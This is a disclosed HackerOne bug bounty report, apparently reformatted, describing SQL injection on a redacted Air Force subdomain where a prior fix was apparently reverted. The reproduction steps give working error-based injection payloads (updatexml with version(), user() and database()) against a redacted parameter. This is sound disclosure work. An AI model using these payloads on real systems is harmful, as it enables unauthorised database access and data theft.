# SQL Injection on █████

## Metadata
- **Source:** HackerOne
- **Report:** 277380 | https://hackerone.com/reports/277380
- **Submitted:** 2017-10-15
- **Reporter:** cdl
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

#### Background:
It looks like the patch for #231338 has been reverted and this subdomain is yet again vulnerable to SQL injection.

### Summary:
An Airforce subdomain is vulnerable to SQL Injection because the application does not produce sufficient validation on user input. This allows an attacker to execute SQL queries.

### Description:
The `███=` parameter on `https://███████/█████████` does not properly sanitize ' characters, allowing an attacker to execute SQL queries!

### Impact

This could potentially expose sensitive information because an attacker could potentially dump the databases on this server!

### Step-by-step Reproduction Instructions

    1.) Open Firefox or any browser
    2.) Visit `https://███████/██████████=' and updatexml(null,concat(0x0a,version()),null)-- -@hackerone.mil`
    3.) You will see the MySQL version in the response => `██████████`

User - `███████`
payload => `https://████████/████████████=' and updatexml(null,concat(0x0a,user()),null)-- -@hackerone.mil`

Database - `████`
payload => `https://██████/█████████████=%27%20and%20updatexml(null,concat(0x0a,database()),null)--%20-@hackerone.mil`

██████
### Suggested Mitigation/Remediation Actions

Sanitize input!

Thanks!
- Corben Douglas [@sxcurity](https://twitter.com/sxcurity)


</details>

---
*Analysed by Claude on 2026-05-24*
